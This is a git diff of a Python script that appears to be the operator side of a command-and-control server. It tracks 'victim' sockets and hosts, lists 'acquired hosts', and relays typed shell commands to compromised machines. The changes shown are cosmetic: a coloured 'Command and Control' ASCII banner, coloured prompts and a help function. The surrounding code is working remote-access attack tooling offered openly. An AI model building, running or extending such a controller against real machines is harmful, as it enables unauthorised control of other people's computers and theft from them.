@@ -1,6 +1,7 @@
 import socket,os
 import threading
-import platform
+from colorama import *
+init()
 CMD = ""
 index = 0
 shell = False
@@ -10,6 +11,42 @@ BUFFER = 1024 * 128
 victim_sockets = []
 victim_address = []
 victim_host = []
+banner = '''
+:'######:::'#######::'##::::'##:'##::::'##::::'###::::'##::: ##:'########::::::::'###::::'##::: ##:'########::
+'##... ##:'##.... ##: ###::'###: ###::'###:::'## ##::: ###:: ##: ##.... ##::::::'## ##::: ###:: ##: ##.... ##:
+ ##:::..:: ##:::: ##: ####'####: ####'####::'##:. ##:: ####: ##: ##:::: ##:::::'##:. ##:: ####: ##: ##:::: ##:
+ ##::::::: ##:::: ##: ## ### ##: ## ### ##:'##:::. ##: ## ## ##: ##:::: ##::::'##:::. ##: ## ## ##: ##:::: ##:
+ ##::::::: ##:::: ##: ##. #: ##: ##. #: ##: #########: ##. ####: ##:::: ##:::: #########: ##. ####: ##:::: ##:
+ ##::: ##: ##:::: ##: ##:.:: ##: ##:.:: ##: ##.... ##: ##:. ###: ##:::: ##:::: ##.... ##: ##:. ###: ##:::: ##:
+. ######::. #######:: ##:::: ##: ##:::: ##: ##:::: ##: ##::. ##: ########::::: ##:::: ##: ##::. ##: ########::
+:......::::.......:::..:::::..::..:::::..::..:::::..::..::::..::........::::::..:::::..::..::::..::........:::
+:'######:::'#######::'##::: ##:'########:'########:::'#######::'##:::::::
+'##... ##:'##.... ##: ###:: ##:... ##..:: ##.... ##:'##.... ##: ##:::::::
+ ##:::..:: ##:::: ##: ####: ##:::: ##:::: ##:::: ##: ##:::: ##: ##:::::::
+ ##::::::: ##:::: ##: ## ## ##:::: ##:::: ########:: ##:::: ##: ##:::::::
+ ##::::::: ##:::: ##: ##. ####:::: ##:::: ##.. ##::: ##:::: ##: ##:::::::
+ ##::: ##: ##:::: ##: ##:. ###:::: ##:::: ##::. ##:: ##:::: ##: ##:::::::          made by wefir@csie
+. ######::. #######:: ##::. ##:::: ##:::: ##:::. ##:. #######:: ########:          2022.June
+:......::::.......:::..::::..:::::..:::::..:::::..:::.......:::........::
+
+'''
+def help():
+
+    print('''
+                Available Commands:
+                                    help:show this help menu
+                                    list:list acquired hosts
+                                    use <index>:open a shell session with a host
+                                    quit:exit the program
+                ''')
+
+def colored(r, g, b, text):
+    return f"\033[38;2;{r};{g};{b}m{text}\033[38;2;255;255;255m"
+def print_banner():
+    global banner
+    colortext = colored(245, 147, 27,banner)
+    print(colortext,end = "")
+
 
 def listener():
     global SERVER_HOST,SERVER_PORT,BUFFER,client_socket, client_address
@@ -37,7 +74,7 @@ def listhosts():
 def C2():
     global shell,CMD,BUFFER,client_socket, client_address,index
     while True:
-        print("C2>",end = "")
+        print(Style.BRIGHT + Fore.RED +"C2>"+Style.RESET_ALL,end = "")
         CMD = input()
         if CMD != "":
             if (CMD.split())[0] == "use":
@@ -48,13 +85,7 @@ def C2():
                 exit()
                 
             elif CMD == "help":
-                print('''
-                Available Commands:
-                                    help:show this help menu
-                                    list:list acquired hosts
-                                    use <index>:open a shell session with a host
-                                    quit:exit the program
-                ''')
+                help()
             elif CMD == "list":
                 listhosts()
             elif CMD == "clear" or CMD == "cls":
@@ -62,8 +93,9 @@ def C2():
         
             else:
                 print(CMD+"[+]Invalid Command.Try typing 'help'")
-        while shell:
-            CMD = input("cmd>")
+        while shell:            
+            print(Style.BRIGHT + Fore.GREEN+"shell$"+Style.RESET_ALL,end="")
+            CMD = input()
             if CMD != "":
                 try:
                     victim_sockets[index].send(CMD.encode())
@@ -79,9 +111,11 @@ def C2():
                     break
                 elif CMD == "cls" or CMD == "clear":
                     os.system("cls")
+
+print_banner()
+help()
 while True:
     thread = threading.Thread(target=C2,args=())
     thread.start()
     listener()
-
 
